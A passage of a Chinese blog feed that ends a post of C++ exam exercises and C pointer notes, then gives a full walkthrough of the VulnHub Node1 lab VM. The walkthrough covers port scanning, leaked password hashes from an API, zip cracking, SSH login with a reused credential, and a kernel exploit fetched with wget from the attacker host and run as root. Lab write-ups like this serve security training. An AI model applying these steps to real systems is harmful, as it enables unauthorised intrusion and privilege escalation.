srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301161828856"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161842319.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161842319.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301161842319"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161914523.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301161914523.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240301161914523"></p><h2 id="other-机试题"><a href="#other-机试题" class="headerlink" title="other 机试题"></a>other 机试题</h2><h3 id="中南大上机压轴"><a href="#中南大上机压轴" class="headerlink" title="中南大上机压轴"></a>中南大上机压轴</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/506ec55b1cc642a7afb2c28c5d175ce8.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/506ec55b1cc642a7afb2c28c5d175ce8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="506ec55b1cc642a7afb2c28c5d175ce8"></p><p>水印是我的CSDN号</p><ul><li>测试数据：</li></ul><blockquote><p>3 500<br>0.6 100<br>0.8 200<br>0.7 100<br>输出 390</p></blockquote><p>​首先要对输入的折扣进行排序，优先使用比率低的z进行支付。<br>​然后用lowcost记录目前多少钱是打过折的。T-lowcost就是剩余没打折的。<br>​每次循环用上一个人的折扣额度。若所有人折扣额度相加低于总价，则最后剩的部分就不打折</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">paychase</span><span class="params">(<span class="type">int</span> N,<span class="type">int</span> T,<span class="type">double</span> *z,<span class="type">int</span>* H)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> lowcost = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(T&lt;=lowcost+z[i]*H[i])&#123;</span><br><span class="line">T = lowcost + (T-lowcost)*H[i];</span><br><span class="line"><span class="keyword">return</span> T;</span><br><span class="line">&#125;<span class="comment">//菜品总价小于折扣</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">lowcost = lowcost + z[i]*H[i];<span class="comment">//lowcost为当前折扣限度，比如第二轮中就是0.6*100+0.8*200</span></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;lowcost:&quot;</span>&lt;&lt;lowcost&lt;&lt;endl;</span><br><span class="line">T = T - H[i] + z[i]*H[i];<span class="comment">//折扣</span></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;T:&quot;</span>&lt;&lt;T&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> N,T;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;请输入人数和菜品总价：&quot;</span>&lt;&lt;endl;</span><br><span class="line">cin&gt;&gt;N&gt;&gt;T;</span><br><span class="line"><span class="type">double</span> z[N];</span><br><span class="line"><span class="type">int</span> H[N];</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;请输入每个的折扣率和折扣上限：&quot;</span>&lt;&lt;endl;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;i&lt;&lt;endl;</span></span><br><span class="line">cin&gt;&gt;z[i]&gt;&gt;H[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=i;j&lt;N;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(z[j]&gt;z[i])&#123;</span><br><span class="line"><span class="type">double</span> tempz;<span class="type">int</span> tempH;</span><br><span class="line">tempz=z[j];z[j]=z[i];z[i]=tempz;</span><br><span class="line">tempH=H[j];H[j]=H[i];H[i]=tempH;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//折扣排序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> cost = <span class="built_in">paychase</span>(N,T,z,H);</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;本次用餐总花费：&quot;</span>&lt;&lt;cost&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="C语言考点"><a href="#C语言考点" class="headerlink" title="C语言考点"></a>C语言考点</h2><h4 id="指针数组，数组指针"><a href="#指针数组，数组指针" class="headerlink" title="指针数组，数组指针"></a>指针数组，数组指针</h4><p>区分<code>int (*p)[3]</code>和<code> int *p[3]</code></p><ul><li>指针数组：<code>int *p[3]</code>，实际上是个数组，只是里面元素都存放的指针，指针指向int型变量地址。</li><li>数组指针：<code>int (*p)[3]</code>，优先级<code>()</code>&gt;<code>[]</code>&gt;<code>*</code>，实际上是定义的一个指针，指向一个包含三个整数的数组。</li></ul><h4 id="int-p"><a href="#int-p" class="headerlink" title="int **p"></a>int **p</h4><p><code>int **p</code>是一个指针的指针。</p><h4 id="赋值判断"><a href="#赋值判断" class="headerlink" title="赋值判断"></a>赋值判断</h4><p><code>int *a=&amp;b</code>(√)</p><p><code>int a=&amp;b</code>(×)</p><p><code>int *a; a=&amp;b</code>(√)</p><p>记住只有指针才能存地址，整型那些都不能存地址。以及<code>int *a</code>后，*a才是取值，a是指向的地址。</p><h4 id="枚举类型中是否可以用小数？枚举类型的值能否修改？"><a href="#枚举类型中是否可以用小数？枚举类型的值能否修改？" class="headerlink" title="枚举类型中是否可以用小数？枚举类型的值能否修改？"></a>枚举类型中是否可以用小数？枚举类型的值能否修改？</h4><p>不可以，不能修改</p><h4 id="不借助第三个变量，交换两个变量的值"><a href="#不借助第三个变量，交换两个变量的值" class="headerlink" title="不借助第三个变量，交换两个变量的值"></a>不借助第三个变量，交换两个变量的值</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用算术运算符交换两个变量的值</span></span><br><span class="line">a = a + b;</span><br><span class="line">b = a - b;</span><br><span class="line">a = a - b;</span><br></pre></td></tr></table></figure><p>后文会更密码学和C易错点记录</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透Node1</title>
      <link href="/2023/06/30/vulnhub-ba-ji-node1/"/>
      <url>/2023/06/30/vulnhub-ba-ji-node1/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶机Node1"><a href="#vulnhub靶机Node1" class="headerlink" title="vulnhub靶机Node1"></a>vulnhub靶机Node1</h1><h2 id="一、有效资产收集"><a href="#一、有效资产收集" class="headerlink" title="一、有效资产收集"></a>一、有效资产收集</h2><table><thead><tr><th>资产编号</th><th>资产分类</th><th>资产名称</th><th>资产规格</th><th>访问地址</th><th>备注&#x2F;问题</th></tr></thead><tbody><tr><td>Node1</td><td>主机系统</td><td>Ubuntu操作系统</td><td>Type:Linux<br />IP:192.168.101.137<br />Port:22、3000</td><td>192.168.101.137</td><td>越权，压缩包爆破，内核提权</td></tr></tbody></table><p>flag：</p><p>&#x3D;&#x3D;1722e99ca5f353b362556a62bd5e6be0&#x3D;&#x3D;</p><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/[node](https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020)-1,252/">https://www.vulnhub.com/entry/[node](https://so.csdn.net/so/search?q=node&amp;spm=1001.2101.3001.7020)-1,252/</a></p><p>访问不到把网络模式改为NAT</p><h2 id="二、渗透测试过程"><a href="#二、渗透测试过程" class="headerlink" title="二、渗透测试过程"></a>二、渗透测试过程</h2><p>kali攻击机ip为192.168.101.128</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230624215915330"></p><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><ul><li>扫描存活主机：目标主机ip为192.168.101.137</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630144602088"></p><p>或者Netdiscover</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144643259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144643259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630144643259"></p><ul><li>通过ping进行三层发现，根据ttl&#x3D;64初步推测该主机为Linux</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.137</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630144850868"></p><ul><li>通过masscan四层发现目标主机开放端口</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.137</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630145106159"></p><p>目标主机只开了两个端口，分别是22和3000端口</p><ul><li><p>扫描目标端口服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.137 -oN nmap.A</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630145455468"></p><ul><li>目标开启了以下端口及服务：<ul><li>22端口，服务为OpenSSH 7.2p2;且系统为Ubunru 4 ubuntu2.2</li><li>3000端口，服务为Apache。且扫描到了&#x2F;login路径，猜测是后台登录界面</li></ul></li></ul><blockquote><p>nodejs默认端口3000，且nodejs是一个基于Chrome JavaScript运行建立的一个平台，基于Google V8引擎，性能很好</p></blockquote><p>使用Nmap中漏洞分类NSE脚本对目标进行探测</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.137</span><br></pre></td></tr></table></figure><hr><p>目标web服务为Node.js Express的站，其他漏洞信息没什么有效的，都是Dos（不算洞）</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150143184.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150143184.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630150143184"></p><p>访问目标3000端口 web服务：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150036209.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150036209.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630150036209"></p><p>访问login路径：但是此页面没测出来弱密码和SQL</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630152103110"></p><h3 id="2-越权"><a href="#2-越权" class="headerlink" title="2. 越权"></a>2. 越权</h3><p>在首页源码闲逛时，看到在<code>view-source:http://192.168.101.137:3000/assets/js/app/controllers/home.js</code>下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> controllers = angular.<span class="title function_">module</span>(<span class="string">&#x27;controllers&#x27;</span>);</span><br><span class="line"></span><br><span class="line">controllers.<span class="title function_">controller</span>(<span class="string">&#x27;HomeCtrl&#x27;</span>, <span class="keyword">function</span> (<span class="params">$scope, $http</span>) &#123;</span><br><span class="line">  $http.<span class="title function_">get</span>(<span class="string">&#x27;/api/users/latest&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">    $scope.<span class="property">users</span> = res.<span class="property">data</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>这段代码是一个AngularJS控制器，命名为HomeCtrl，接收scope和http两个参数。控制器中向服务器<code>/api/users/latest</code>发起GET请求，用then()处理相应并把数据赋给$scope.users</p></blockquote><p>跟随路径到&#x2F;api&#x2F;users&#x2F;latest，看到了用户名及其password的json数据，不过这里只有非管理员用户</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153128915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153128915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630153128915"></p><p>再向上一级，找到管理员用户：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153300331.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153300331.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630153300331"></p><p>将管理员用户<code>myP14ceAdminAcc0uNT</code>的密码<code>dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af</code>拿到somd5解密：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153428460.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153428460.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630153428460"></p><p>密码为<code>manchester</code></p><p>登录成功，网页中心有<code>Download backup</code>按钮</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630153509065"></p><h3 id="3-爆破解压压缩包"><a href="#3-爆破解压压缩包" class="headerlink" title="3. 爆破解压压缩包"></a>3. 爆破解压压缩包</h3><p>下载下来看到是base64编码，解码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -d myplace.backup &gt; decode.backup</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630155720132"></p><p>文件类型为zip：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155751094.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155751094.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630155751094"></p><p>解压需要密码：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630155844544"></p><p>用fcrackzip，字典rockyou进行爆破：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decode.backup</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630160151526"></p><p>密码为magicword</p><h3 id="4-ssh登录"><a href="#4-ssh登录" class="headerlink" title="4. ssh登录"></a>4. ssh登录</h3><p>unzip解压后出现var文件夹：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160806475.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160806475.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630160806475"></p><p>在app.js中定义的url常量，<code>mark:5AYRft73VtFpc84k@localhost:27017</code>很像ssh登录</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630160950825"></p><p>尝试进行ssh登录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mark@192.168.101.137</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630161239357"></p><h3 id="5-ubuntu16-04内核提权"><a href="#5-ubuntu16-04内核提权" class="headerlink" title="5. ubuntu16.04内核提权"></a>5. ubuntu16.04内核提权</h3><ul><li>查看用户的sudo权限：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630161755572"></p><p>mark用户不能使用sudo</p><ul><li>查看有suid的命令：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630161845240"></p><p>没有find这种提权的命令</p><ul><li>查看内核版本及操作系统版本：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630161859489"></p><p>内核版本为4.4.0-93，系统版本为ubuntu16.04</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162035164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162035164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630162035164"></p><ul><li>查看是否存在gcc和版本</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630162058464"></p><p>搜索ubuntu 16.04存在的漏洞：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630163926335"></p><p>把exp下载到本地：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 44298.c</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630172752982"></p><p>本地用python起一个web服务：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630173048686"></p><p>靶机上cd到tmp目录下载exp</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.101.128:8000/44298.c</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630173213371"></p><p>gcc编译执行exp:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc 44298.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630173345884"></p><p>在&#x2F;root目录下找到flag:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173408611.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173408611.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230630173408611"></p><p>flag:&#x3D;&#x3D;1722e99ca5f353b362556a62bd5e6be0&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透CH4INRULZ_v1.0.1</title>
      <link href="/2023/06/29/vulnhub-ba-ji-ch4inrulz-v1.0.1/"/>
      <url>/2023/06/29/vulnhub-ba-ji-ch4inrulz-v1.0.1/</url>
      
        <content type="html"><![CDATA[<h1 id="CH4INRULZ-v1-0-1"><a href="#CH4INRULZ-v1-0-1" class="headerlink" title="CH4INRULZ_v1.0.1"></a>CH4INRULZ_v1.0.1</h1><h2 id="一、有效资产收集"><a href="#一、有效资产收集" class="headerlink" title="一、有效资产收集"></a>一、有效资产收集</h2><table><thead><tr><th>资产编号</th><th>资产分类</th><th>资产名称</th><th>资产规格</th><th>访问地址</th><th>备注&#x2F;问题</th></tr></thead><tbody><tr><td>CH4INRULZ_v1.0.1</td><td>主机系统</td><td>Ubuntu操作系统</td><td>Type:Linux<br />IP:192.168.101.133<br />Port:21、22、80、8081</td><td>192.168.101.133</td><td>openssh版本较低，web备份信息泄露导致的后台可登录。文件上传漏洞。脏牛提权</td></tr></tbody></table><p>靶机flag:&#x3D;&#x3D;8f420533b79076cc99e9f95a1a4e5568&#x3D;&#x3D;</p><p>靶机地址：<a href="https://download.vulnhub.com/ch4inrulz/CH4INRULZ_v1.0.1.ova">https://download.vulnhub.com/ch4inrulz/CH4INRULZ_v1.0.1.ova</a></p><h2 id="二、渗透测试过程"><a href="#二、渗透测试过程" class="headerlink" title="二、渗透测试过程"></a>二、渗透测试过程</h2><p>kali攻击机ip为192.168.101.128</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230624215915330"></p><h3 id="（1）信息收集"><a href="#（1）信息收集" class="headerlink" 